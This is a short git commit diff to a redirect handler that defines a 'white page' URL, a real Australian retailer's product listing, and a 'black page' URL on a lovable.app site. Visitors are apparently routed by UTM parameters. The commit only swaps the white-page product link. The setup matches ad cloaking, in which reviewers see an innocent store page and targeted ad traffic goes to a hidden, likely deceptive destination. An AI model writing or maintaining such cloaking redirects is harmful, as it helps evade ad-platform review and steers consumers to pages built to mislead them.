ce653a542180aafd5494df2a2fb04d49dac7facf
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-16 03:03:59 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babybunting.com.au/product/everfit-14ft-trampoline-with-basketball-hoop-orange-7004384";
+    const whitePageURL = "https://www.jbhifi.com.au/products/belkin-boostup-charge-dual-usb-c-car-charger-36w-black";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
